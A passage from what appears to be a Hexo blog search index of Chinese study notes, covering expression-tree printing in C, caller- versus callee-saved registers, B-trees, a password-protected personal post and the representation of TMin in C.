class="hljs-title">rchild</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">op</span>=='+'||q-&gt;</span><span class="hljs-function"><span class="hljs-title">rchild</span>-&gt;</span>op==<span class="hljs-string">'-'</span>))&#123;printf(<span class="hljs-string">"("</span>);<span class="hljs-function"><span class="hljs-title">dfs</span>(q-&gt;</span>rchild);printf(<span class="hljs-string">")"</span>);&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-function"><span class="hljs-title">dfs</span>(q-&gt;</span>rchild);&#125;&#125;<span class="hljs-function"><span class="hljs-title">else</span> <span class="hljs-keyword">if</span>(q-&gt;</span>op==<span class="hljs-string">'/'</span>)&#123;<span class="hljs-function"><span class="hljs-title">if</span>(q-&gt;</span><span class="hljs-function"><span class="hljs-title">lchild</span>!=NULL&amp;&amp;(q-&gt;</span><span class="hljs-function"><span class="hljs-title">lchild</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">op</span>=='+'||q-&gt;</span><span class="hljs-function"><span class="hljs-title">lchild</span>-&gt;</span>op==<span class="hljs-string">'-'</span>))&#123;printf(<span class="hljs-string">"("</span>);<span class="hljs-function"><span class="hljs-title">dfs</span>(q-&gt;</span>lchild);printf(<span class="hljs-string">")"</span>);&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-function"><span class="hljs-title">dfs</span>(q-&gt;</span>lchild);&#125;<span class="hljs-function"><span class="hljs-title">printf</span>("%c",q-&gt;</span>op);<span class="hljs-function"><span class="hljs-title">if</span>(q-&gt;</span><span class="hljs-function"><span class="hljs-title">rchild</span>!=NULL&amp;&amp;(q-&gt;</span><span class="hljs-function"><span class="hljs-title">rchild</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">op</span> == '+'||q-&gt;</span><span class="hljs-function"><span class="hljs-title">rchild</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">op</span>=='-'||q-&gt;</span><span class="hljs-function"><span class="hljs-title">rchild</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">op</span>=='*'||q-&gt;</span><span class="hljs-function"><span class="hljs-title">rchild</span>-&gt;</span>op == <span class="hljs-string">'/'</span>))&#123;printf(<span class="hljs-string">"("</span>);<span class="hljs-function"><span class="hljs-title">dfs</span>(q-&gt;</span>rchild);printf(<span class="hljs-string">")"</span>);&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-function"><span class="hljs-title">dfs</span>(q-&gt;</span>rchild);&#125;&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-function"><span class="hljs-title">dfs</span>(q-&gt;</span>lchild);<span class="hljs-function"><span class="hljs-title">printf</span>("%d",q-&gt;</span>num);<span class="hljs-function"><span class="hljs-title">dfs</span>(q-&gt;</span>rchild);&#125;&#125;&#125;</code></pre></li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>数据结构</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>caller saved registers and callee saved registers</title>
    <link href="/2020/05/16/caller-save-registers-and-callee-save-registers/"/>
    <url>/2020/05/16/caller-save-registers-and-callee-save-registers/</url>
    
    <content type="html"><![CDATA[<p>看的书里“被调用者保存寄存器”黑体部分没有带上“被”，云里雾里，不知道是印刷的问题还是翻译的问题。还是用英文概念区分安全。<br><a id="more"></a></p><p><img src="/2020/05/16/caller-save-registers-and-callee-save-registers/WgcQv.png?v=1&amp;type=image" srcset="/img/loading.gif" alt="输入图片描述"></p><hr><p>根据stack overflow看到的回答：</p><blockquote><p><strong>Caller-saved registers</strong>  (AKA  <strong>volatile</strong>  registers, or  <strong>call-clobbered</strong>) are used to hold temporary quantities that need not be preserved across calls.</p></blockquote><p>For that reason, it is the caller’s responsibility to push these registers onto the stack or copy them somewhere else  _if_  it wants to restore this value after a procedure call.</p><p>It’s normal to let a  <code>call</code>  destroy temporary values in these registers, though.</p><blockquote><p><strong>Callee-saved registers</strong>  (AKA  <strong>non-volatile</strong>  registers, or  <strong>call-preserved</strong>) are used to hold long-lived values that should be preserved across calls.</p></blockquote><p>When the caller makes a procedure call, it can expect that those registers will hold the same value after the callee returns, making it the responsibility of the callee to save them and restore them before returning to the caller. Or to not touch them.</p><hr><p>所谓的caller saved register，其实就是寄存器保存的值函数调用时不保留，所以如果需要要通过入栈或保留到其他地方来保存这个值。</p>]]></content>
    
    
    <categories>
      
      <category>C</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>B-树及其相关操作</title>
    <link href="/2020/05/14/B-%E6%A0%91%E5%8F%8A%E5%85%B6%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C/"/>
    <url>/2020/05/14/B-%E6%A0%91%E5%8F%8A%E5%85%B6%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C/</url>
    
    <content type="html"><![CDATA[<p>B-树（B树）属于自平衡树，多路查找树。<br><a id="more"></a></p><hr><h3 id="性质"><a href="#性质" class="headerlink" title="性质"></a>性质</h3><p>一个m阶的B-树为满足下列性质的m叉树：</p><ol><li>每一个分支节点最多有m棵子树。</li><li>除根节点外，每个分支节点至少有$\lceil m/2 \rceil$棵子树。</li><li>根节点至少包含两棵子树（除非根节点即叶节点）</li><li>所有叶节点都在同一层，叶节点不包含任何关键字信息</li><li>所有分支结点包含以下信息<br>$n，p_{0}，key_{1}，p_{1}，key_{2}，p_{2}，\ldots，key_{n}，p_{n}$</li></ol><ul><li>n为节点中关键字的个数，满足$n \leq m-1$</li><li>$key_{i}$为关键字，满足$key_{i} &lt; key_{i+1}$</li><li>$p_{i}$为指向该节点第$i+1$棵子树的指针， 且该子树中关键字的值整体满足$key_{i} &lt; nextfloor-key_{i} &lt; key_{i+1}$</li></ul><p>图例：<br><img src="/2020/05/14/B-%E6%A0%91%E5%8F%8A%E5%85%B6%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C/2-1G024101S02K.png?v=1&amp;type=image" srcset="/img/loading.gif" alt="输入图片描述"></p><hr><h3 id="相关操作"><a href="#相关操作" class="headerlink" title="相关操作"></a>相关操作</h3><hr><h4 id="查找"><a href="#查找" class="headerlink" title="查找"></a>查找</h4><p>查找过程与二叉查找树相似。<br><pre><code class="hljs crmsh"><span class="hljs-comment">#define M 1000</span>struct <span class="hljs-keyword">Node</span><span class="hljs-title">&#123;</span><span class="hljs-title">int</span> keynum;keytype key[M];struct <span class="hljs-keyword">Node</span> <span class="hljs-title">*ptr</span>[M];&#125;;typedef struct <span class="hljs-keyword">Node</span> <span class="hljs-title">BNode</span>;</code></pre></p><h2 id><a href="#" class="headerlink" title></a><pre><code class="hljs gauss">keytype <span class="hljs-built_in">searchBTree</span>(BNode *t,keytype k)&#123;int i,n;BNode *p = t;<span class="hljs-keyword">while</span>(p!= <span class="hljs-built_in">NULL</span>)&#123;n = p-&gt;keynum;i = <span class="hljs-number">1</span>;<span class="hljs-keyword">while</span>(p-&gt;<span class="hljs-built_in">key</span>[i++] &lt; k);<span class="hljs-keyword">if</span>(p-&gt;<span class="hljs-built_in">key</span>[i] == k)<span class="hljs-keyword">return</span> p-&gt;<span class="hljs-built_in">key</span>[i];<span class="hljs-keyword">else</span>p = p-&gt;ptr[i<span class="hljs-number">-1</span>];&#125;<span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;&#125;</code></pre></h2><h4 id="插入节点（建树）"><a href="#插入节点（建树）" class="headerlink" title="插入节点（建树）"></a>插入节点（建树）</h4><p>B-树的生成从空树开始，即逐个在叶节点中插入节点而得到。当m阶树节点中关键字个数大于m-1，则要节点分裂。<br>节点分裂：若将k插入到节点后使该节点的关键字个数超过m-1，则要以该节点位置居中的那个关键字值为界将该节点一分为二，产生一个新节点（q:[1,$\ldots$,$\lceil$m/2$\rceil$-1],q’:[$\lceil$m/2$\rceil$+1,$\ldots$,m-1]），并将$key_{\lceil m/2 \rceil}$与指向q和q’的指针插入到双亲节点中。<br><img src="/2020/05/14/B-%E6%A0%91%E5%8F%8A%E5%85%B6%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C/2-1G024102942E3.png?v=1&amp;type=image" srcset="/img/loading.gif" alt><br>插入26：<br><img src="/2020/05/14/B-%E6%A0%91%E5%8F%8A%E5%85%B6%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C/2-1G024103030D2.png?v=1&amp;type=image" srcset="/img/loading.gif" alt="输入图片描述"></p><p>代码示例：<br><pre><code class="hljs plain"></code></pre></p>]]></content>
    
    
    <categories>
      
      <category>数据结构</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>study tree</title>
    <link href="/2020/05/13/study-tree/"/>
    <url>/2020/05/13/study-tree/</url>
    
    <content type="html"><![CDATA[<p>可参考学习<br><img src="/2020/05/13/study-tree/security_skill_tree_basic.png" srcset="/img/loading.gif" alt></p>]]></content>
    
    
    <categories>
      
      <category>Security</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>二十而惑</title>
    <link href="/2020/05/08/%E4%BA%8C%E5%8D%81%E8%80%8C%E6%83%91/"/>
    <url>/2020/05/08/%E4%BA%8C%E5%8D%81%E8%80%8C%E6%83%91/</url>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="解不开吗，不如联系我？" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">虽然不是什么隐私，但是还是小小加密一下,不知道弱密码DES加密后强度怎么样呢（吐槽一下这个人DES加密结果和网上不一样，却偏偏可以成功解密）</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="206d2f345fc318f0ac61d68bf54806935183fc559e9f838e79c3c069df8745b0">77693571ec78997a7b96dba600488f82db6bb9471b0e373f2dc713e3ee528ce731c902d618004444904dd1e27d1917b86fa3bf0d9f6fe5227d95270eb9a51013a19cf5ad506cbb2b733ecc1b87bd800bf528fa774017a90bb303d7733eddfe1ca8bae4ec5214fd41ec1f1cb4713b5d14a0031570ab0d9f1f364fd9a664cfac8f61d40312d9b4c2312c8624506bf02e021ddf706f4f23d8fab470067b295be12b94c02a731fe0f694f448798a17ce2c37f9355aee81196385d6104d8ffa0a9559bf8ce3e923fba1fdeb56d4f67b3f1e13d0b6ad8050d4b2f06eaf8786c8034b79095eaa62a592d0b4313dd732b9e130a05bcb472ebfb4533ad49481a6eeb6aeeb6a0781dc7a84fce2317a5fd5515229a37864557d05d982bdd5894cc12e10cdc524d8a4ed437d76eba5cad5ef88eb35a9fd6c4012fda332d610a58e861a4514cfe3784fd19fbe38f1c2b4dc7b4e77fc7a63988e93ae33b06dcbb3347858f606b369d2d069b8c9422b1e60227f703e0e1f7715f50e1d37deac818d189866ace91987f8dd7728b52c60fa5f405ff44d9b89de266a68ac784571353ce64c66bb5fb12304a197583ea2af510eeb7c189cd3967dd90589def36f1c0429a473f145af215175645142af7a4eb43bc73bfec0c1656e362aedda2930b948ac887871f2ca86c5e500e1d6899a4cb898a276bf26e6fc4ab69e80f2c49f581061e35d43605d983dd484af6cb3cc30726da4f5dd5963595a9898e9f1fd68d1b02af11873b7218b9b825188acf70a9b4578990c3fe2203b692b773c90c286d64cad0953679921a849a90146529c049bda2def46e4573f1894cc9861d723b5ee139f282319a5013c30cfc041ad0155b215e67248b18d5f4da0c4cb1480142c00995ce892e05ca516fc597ca3507770a5d86ede8a16cb871ab934539b9ec7e7821a29adf817c9c63fca4d49297b58f615a0bbe519677d32693aece2e0e5176ed37b3c1e27b668370cdcc76d868a63a16660299e144f1d56b85a02d62435814d3b63c9b3e075d6f3de135976f13e84fd45c5751a296a687c172f9bcbbb2de1b65a76b9407ce8d92db270ed3cddbbcf8cf7789904ae3254dd9790cf2ca251f98ad8191e0ec7812d38dec3d1d3b62fa1e621e519a5b6b64c8118238431d3e23620e951b5252bcb70fda60725cfd2b4395f45b801886209d1a0510b85663481a06a7e1c94ae733d9ecc4f47b22039b0a3ef8cafd503357ccfda76caf8aaf37343a96b616be1a03f2351df9acfcc73849984670699dc2be38dea617424d8ed025d211e3552dd136cd4bee8408b3f79c603637c30e6de9d033f50b515adcd8c9389fed5ee3663268c06b27679d2787b9cd3bf9f73c340f24ca0b1d85173377163a72674dba576d4e89f051972af2fa015e7408f15fcb0066a3cafba7a50385f1b62e5e18ed6c9face6d5d4dd775f255f4bea3450aeaf0b32786d51b5760900f0ec31ed0078a3e7969638bc766a1ff429533613ddfed755b1c69bb197302df97512b4b13bcc87cdbbfca672fda20c332770b0599ea76e06e1f7ea1b86518e81777cd92c4c739a54ac35d196e2e2c4d043962c4c24bd01b33b78b09c70edc4124998e461852c1ff96ebdd8bb4ae80d72fa19ea38bedc3edc79c7c6aaf4a3d9f86baaee1ce50a65edd0657ce54a912aeda15eee123c95a0ab3b32faef4fa8508a0676024277ca84795b34035f06160fe9d842429a8f2643066857b078ab05fa988e051f2bcb6ebb3914f2533702552873dd5391e18b634e6071de481251ae36acbe41888edf809ce0ca1bcbd8e30910f4416d93ad370f0d221f43d327621800868be9b8377a5e5621b241fdc7c19ece212e457df913eaf4f19050a08f7ff490dc41763ba3aa8c749849f5f98701f2c71a9cd2bb3cf3a61010e14c8d4fd0947cf2510de4150d249f719a9826c1f6ff9fb208e1fab4db5a09037cbe0818fb330037e82a0b58c58f641bbe1c61c85258155365126329728a4ed02f840fcde1197176d675a576323547c23c91fb45164d3f086a7441fe6b64bedeb31e931982b093660b3d381355c2b72f5e57e2a46c9269d06b0297d64a23bc37adf3eecf08ecca5c8f952d8b5e6f3b483af6ab77e21a3a9b87b934ef1458a40f2aaa541a17c4755cf25738b5e7a32e232168a6ac06ef68ea550780c10f2168c5d5e21c2e8b38eb6cf7236ea5787b3a6a11f6eb76177d7c8a68ff26ab3cab65f5b9b3ff672d063e4fd49f50580a13839ff2e56c051e425fcff179f7a53bb59672a824349957e9ae87f9d03b75e6f327957001de7ae5b6d1be52674f37dec6d0dc384d982205a6e9f0c5b148f0718883ec96d455dcbbc2d9bcb8d48a8a990f0e2c0625f5ccb7d3bca68118264e1bf2615f3a8d38c4dbdbed49e54738c2d024361ff304c2b9bb279c61af5ee70740af8fc1e9296464c0f168299b2d6ab4df0aa5c2d5166c80f1089c22ba413d866eb5015981842609efd5efd9ce520dee229cebf053e8ed1ecf7ecab3804111a00dfbcdb43d1e14fce5eac1a7ca60c8c34d383fe985902d9815f81f2d10afefeb8cfe579af50286a5f06bc98b265c2278e2f47e1b1a5c4211d248917270b766833502d2fe138417cf19a0e25ca82edecd9575eb11a14c3c2f57cba43241ab4510af79e915d1779e28316e1ee6e7367f43b5045b647f8e5d066eb57718cdf982b0dcbf66906996c27db0d9fa9dba060e41872b1d9e7cd02fafca73f5f39666f3bed8a9337e7f595f303b24db1ce3ec2f7647967874864e8a7f3c2fc394525c6886b90cf879d5791bf3fc920b1665c83c2aeaf26d48d2b688ab6b7116dc0f262aecd0a6a46e1db04c83e4208c41484e2d4b11372ef65d1cdff504435ea16cb82d70530d50a19c7d1ff5bc084d441dc53445cb47afb38daf5397895266e62c43c8674b05fa479c8132e3953c7d9e3a9f8d21dfedc98870a8f7f55406e74d72a1a3900c52993ba6a7dea48</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>生活随笔</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>something about Tmin</title>
    <link href="/2020/05/08/something-about-Tmin/"/>
    <url>/2020/05/08/something-about-Tmin/</url>
    
    <content type="html"><![CDATA[<p>在C语言中，表示TMin（32位为例）通常不用-2147483648,而用-2147483647-1</p><p>reason:</p><p>When the compiler encounters a number of the form -X, it first determines the data type and value for X and then negates it.</p><p>对于十进制与十六进制数c的处理为</p><p>ISO90:Decimal int-long-unsigned-unsigned long</p><p>Hexadecimal int-unsigned-long-unsigned long</p><p>ISO99:Decinal int-long-long long</p><p>Hexadecimal int-unsigned-long-unsigned long-long long-unsigned long long<br><a id="more"></a><br>对于数-2147483648的处理：</p><p>ISO90:32位程序 unsigned</p><p>64位程序 long</p><p>ISO99:32位程序 long long</p><p>64位程序 long</p><p>对于-2147483648的十六进制表示0x80000000:</p><p>ISO90:32位程序 unsigned</p><p>64位程序 unsigned</p><p>ISO99:32位程序 unsigned</p><p>64位程序 unsigned</p><pre><code class="hljs angelscript"><span class="hljs-built_in">int</span> dpos32 = (<span class="hljs-number">-2147483648</span> &gt; <span class="hljs-number">0</span>);<span class="hljs-built_in">int</span> hpos32 = (<span class="hljs-number">0x80000000</span> &gt; <span class="hljs-number">0</span>);printf(<span class="hljs-string">"%d %d"</span>,dpos32,hpos32);</code></pre><p>对ISO90标准，32位程序输出1 1</p><p>64位程序输出0 1</p><p>对ISO99标准，32位程序输出0 1</p><p>64位程序输出0 1</p><p>但是对于</p><pre><code class="hljs angelscript"><span class="hljs-built_in">int</span> dtmin32 = <span class="hljs-number">-2147483648</span>;<span class="hljs-built_in">int</span> dposa = (dtmin32 &gt; <span class="hljs-number">0</span>);<span class="hljs-built_in">int</span> htmin32 = <span class="hljs-number">0x80000000</span>;<span class="hljs-built_in">int</span> hposa = (htmin32 &gt; <span class="hljs-number">0</span>);printf(<span class="hljs-string">"%d %d"</span>,dposa,hposa);</code></pre><p>无论32位或64位，无论ISO90或ISO99 ,输出都是：0 0</p>]]></content>
    
    
    <categories>
      
      <category>C</category>
      
    </categories>
    
    
  </entry>
  
  
  
  
</search>
